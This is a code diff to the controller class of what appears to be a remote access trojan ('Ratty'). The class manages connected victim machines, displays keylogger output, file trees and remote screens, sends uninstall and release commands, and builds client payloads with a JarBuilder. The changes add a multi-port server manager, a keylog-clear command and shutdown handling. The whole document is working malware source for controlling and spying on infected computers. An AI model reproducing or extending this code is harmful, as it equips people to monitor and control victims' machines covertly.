@@ -7,6 +7,7 @@ import java.io.File;
 import java.io.IOException;
 import java.net.URL;
 import java.text.SimpleDateFormat;
+import java.util.Collection;
 import java.util.HashMap;
 import java.util.Set;
 import java.util.stream.Collectors;
@@ -15,17 +16,18 @@ import java.util.stream.Stream;
 import javax.imageio.ImageIO;
 import javax.swing.ImageIcon;
 import javax.swing.JFileChooser;
+import javax.swing.JOptionPane;
 import javax.swing.filechooser.FileFilter;
 import javax.swing.filechooser.FileNameExtensionFilter;
 
 import de.sogomn.engine.fx.Sound;
 import de.sogomn.rat.ActiveConnection;
-import de.sogomn.rat.builder.JarBuilder;
 import de.sogomn.rat.gui.ChatWindow;
 import de.sogomn.rat.gui.DisplayPanel;
 import de.sogomn.rat.gui.FileTree;
 import de.sogomn.rat.gui.FileTreeNode;
 import de.sogomn.rat.gui.IGuiController;
+import de.sogomn.rat.gui.LoggingGui;
 import de.sogomn.rat.gui.Notification;
 import de.sogomn.rat.packet.AudioPacket;
 import de.sogomn.rat.packet.ChatPacket;
@@ -56,6 +58,7 @@ import de.sogomn.rat.server.AbstractRattyController;
 import de.sogomn.rat.server.ActiveServer;
 import de.sogomn.rat.util.Constants;
 import de.sogomn.rat.util.FrameEncoder.Frame;
+import de.sogomn.rat.util.JarBuilder;
 import de.sogomn.rat.util.XorCipher;
 
 /*
@@ -65,14 +68,14 @@ import de.sogomn.rat.util.XorCipher;
  */
 public final class RattyGuiController extends AbstractRattyController implements IGuiController {
 	
-	private ActiveServer server;
-	private IRattyGui gui;
+	private AbstractRattyGui gui;
 	private BuilderGui builder;
+	private ServerListGui serverList;
 	private JFileChooser fileChooser;
 	
 	private HashMap<ActiveConnection, ServerClient> clients;
 	private File selectedBuilderFile;
-	private long startTime;
+	private long lastNotification;
 	
 	private static final String BUILDER_DATA_REPLACEMENT = "data";
 	private static final String BUILDER_DATA_REPLACEMENT_FORMAT = "%s:%s";
@@ -135,12 +138,11 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	private static final String FLAG_ADDRESS = "http://www.geojoe.co.uk/api/flag/?ip=";
 	private static final long PING_INTERVAL = 5000;
-	private static final long NOTIFICATION_DELAY = 5000;
+	private static final long NOTIFICATION_INTERVAL = 5000;
 	
 	private static final Sound PING = Sound.loadSound("/ping.wav");
 	
-	public RattyGuiController(final ActiveServer server, final IRattyGui gui) {
-		this.server = server;
+	public RattyGuiController(final AbstractRattyGui gui) {
 		this.gui = gui;
 		
 		final Thread pingThread = new Thread(() -> {
@@ -158,11 +160,12 @@ public final class RattyGuiController extends AbstractRattyController implements
 		}, "Ping");
 		
 		builder = new BuilderGui();
+		serverList = new ServerListGui();
 		fileChooser = new JFileChooser();
 		clients = new HashMap<ActiveConnection, ServerClient>();
-		startTime = System.currentTimeMillis();
 		
 		fileChooser.setCurrentDirectory(Constants.JAR_FILE);
+		serverList.addListener(this);
 		builder.addListener(this);
 		
 		pingThread.setDaemon(true);
@@ -360,9 +363,9 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private FreePacket createFreePacket() {
-		final boolean accepted = gui.showWarning(FREE_WARNING, YES, CANCEL);
+		final int input = gui.showWarning(FREE_WARNING, YES, CANCEL);
 		
-		if (accepted) {
+		if (input == JOptionPane.YES_OPTION) {
 			final FreePacket packet = new FreePacket();
 			
 			return packet;
@@ -430,9 +433,9 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private UninstallPacket createUninstallPacket() {
-		final boolean accepted = gui.showWarning(UNINSTALL_WARNING, YES, CANCEL);
+		final int input = gui.showWarning(UNINSTALL_WARNING, YES, CANCEL);
 		
-		if (accepted) {
+		if (input == JOptionPane.YES_OPTION) {
 			final UninstallPacket packet = new UninstallPacket();
 			
 			return packet;
@@ -553,6 +556,65 @@ public final class RattyGuiController extends AbstractRattyController implements
 		builder.removeListEntry(selectedEntry);
 	}
 	
+	private void exit() {
+		final Collection<ServerClient> clientSet = clients.values();
+		
+		for (final ServerClient client : clientSet) {
+			client.removeAllListeners();
+			client.logOut();
+		}
+		
+		clients.clear();
+		
+		for (final ActiveConnection connection : connections) {
+			connection.setObserver(null);
+			connection.close();
+		}
+		
+		connections.clear();
+		
+		for (final ActiveServer server : servers) {
+			server.setObserver(null);
+			server.close();
+		}
+		
+		servers.clear();
+		
+		builder.removeAllListeners();
+		builder.close();
+		
+		System.exit(0);
+	}
+	
+	private void startServer() {
+		final String portString = serverList.getPort();
+		
+		try {
+			final int port = Integer.parseInt(portString);
+			
+			/*65535 = Max port*/
+			if (port <= 0 || port > 65535) {
+				return;
+			}
+			
+			startServer(port);
+		} catch (final Exception ex) {
+			//...
+		}
+	}
+	
+	private void stopServer() {
+		final String portString = serverList.getSelectedItem();
+		
+		try {
+			final int port = Integer.parseInt(portString);
+			
+			stopServer(port);
+		} catch (final Exception ex) {
+			//...
+		}
+	}
+	
 	private void handleCommand(final ServerClient client, final String command) {
 		if (command == RattyGui.FILES) {
 			client.fileTree.setVisible(true);
@@ -568,12 +630,14 @@ public final class RattyGuiController extends AbstractRattyController implements
 			client.chat.setVisible(true);
 		} else if (command == RattyGui.KEYLOG) {
 			client.logger.setVisible(true);
+		} else if (command == LoggingGui.CLEAR) {
+			client.logger.clear();
 		}
 	}
 	
 	private void handleGlobalCommand(final String command) {
 		if (command == RattyGui.CLOSE) {
-			server.close();
+			exit();
 		} else if (command == RattyGui.BUILD) {
 			builder.setVisible(true);
 		} else if (command == BuilderGui.CHOOSE) {
@@ -586,6 +650,12 @@ public final class RattyGuiController extends AbstractRattyController implements
 			addBuilderEntry();
 		} else if (command == BuilderGui.REMOVE) {
 			removeBuilderEntry();
+		} else if (command == RattyGui.MANAGE_SERVERS) {
+			serverList.setVisible(true);
+		} else if (command == ServerListGui.START) {
+			startServer();
+		} else if (command == ServerListGui.STOP) {
+			stopServer();
 		}
 	}
 	
@@ -845,7 +915,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		final String version = packet.getVersion();
 		final String address = client.getAddress();
 		final ImageIcon icon = getFlagIcon(address);
-		final boolean shouldNotify = System.currentTimeMillis() - startTime > NOTIFICATION_DELAY;
+		final boolean shouldNotify = System.currentTimeMillis() - lastNotification > NOTIFICATION_INTERVAL;
 		
 		client.logIn(name, os, version, icon);
 		client.addListener(this);
@@ -858,7 +928,31 @@ public final class RattyGuiController extends AbstractRattyController implements
 			
 			notification.trigger();
 			PING.play();
+			
+			lastNotification = System.currentTimeMillis();
 		}
+	}
+	
+	@Override
+	public void startServer(final int port) {
+		final String portString = String.valueOf(port);
+		final boolean contains = serverList.contains(portString);
+		
+		super.startServer(port);
+		
+		if (!contains) {
+			serverList.addItem(portString);
+			serverList.setPort("");
+		}
+	}
+	
+	@Override
+	public void stopServer(final int port) {
+		final String portString = String.valueOf(port);
+		
+		super.stopServer(port);
+		
+		serverList.removeItem(portString);
 	}
 	
 	@Override
@@ -915,11 +1009,12 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	@Override
 	public void closed(final ActiveServer server) {
+		final int port = server.getPort();
+		final String portString = String.valueOf(port);
+		
 		super.closed(server);
 		
-		builder.close();
-		
-		System.exit(0);
+		serverList.removeItem(portString);
 	}
 	
 	@Override
@@ -928,8 +1023,8 @@ public final class RattyGuiController extends AbstractRattyController implements
 		
 		if (source instanceof ServerClient) {
 			client = (ServerClient)source;
-		} else if (source instanceof IRattyGui) {
-			final IRattyGui gui = (IRattyGui)source;
+		} else if (source instanceof AbstractRattyGui) {
+			final AbstractRattyGui gui = (AbstractRattyGui)source;
 			
 			client = gui.getSelectedClient();
 		} else {
